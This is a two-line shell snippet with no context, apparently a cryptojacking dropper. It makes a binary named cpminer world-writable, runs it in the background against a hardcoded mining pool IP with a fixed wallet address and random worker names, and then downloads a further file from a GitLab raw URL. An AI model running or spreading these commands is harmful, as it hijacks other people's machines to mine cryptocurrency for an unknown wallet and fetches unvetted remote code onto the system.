chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u us13TQht7hLRLLQPFyjUwQBRjUtMnTjbHN.$(shuf -n 1 -i 1-99999)-VISH -t4 &

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
